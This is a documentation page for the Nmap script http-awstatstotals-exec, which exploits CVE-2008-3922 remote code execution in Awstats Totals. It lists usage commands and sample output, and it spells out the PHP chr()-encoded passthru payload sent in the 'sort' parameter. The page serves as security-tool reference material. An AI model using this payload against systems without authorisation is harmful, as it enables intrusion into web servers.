---
title: "http-awstatstotals-exec"
source: official
category: "Vuln"
categories:
  - "vuln"
  - "intrusive"
  - "exploit"
shortDescription: "Exploits a remote code execution vulnerability in Awstats Totals 1.0 up to 1.14\nand possibly other products based on it (CVE: 2008-3922)."
risk: intrusive
tags:
  - "vuln"
  - "intrusive"
  - "exploit"
  - "portrule"
scriptTypes:
  - "portrule"
protocols: []
ports: []
usage: "nmap -sV --script http-awstatstotals-exec.nse --script-args 'http-awstatstotals-exec.cmd=\"uname -a\", http-awstatstotals-exec.uri=/awstats/index.php' <target>\nnmap -sV --script http-awstatstotals-exec.nse <target>"
outputPreview:
  - "PORT   STATE SERVICE REASON"
  - "80/tcp open  http    syn-ack"
  - "| http-awstatstotals-exec.nse:"
  - "|_Output for 'uname -a':Linux 2.4.19 #1 Son Apr 14 09:53:28 CEST 2002 i686 GNU/Linux"
author: "Nmap Project"
reference:
  label: "View Official Script Source"
  url: "https://svn.nmap.org/nmap/scripts/http-awstatstotals-exec.nse"
documentationUrl: "https://nmap.org/nsedoc/scripts/http-awstatstotals-exec.html"
---

Exploits a remote code execution vulnerability in Awstats Totals 1.0 up to 1.14
and possibly other products based on it (CVE: 2008-3922).
This vulnerability can be exploited through the GET variable sort .
The script queries the web server with the command payload encoded using PHP's
chr() function:
?sort={%24{passthru%28chr(117).chr(110).chr(97).chr(109).chr(101).chr(32).chr(45).chr(97)%29}}{%24{exit%28%29}}
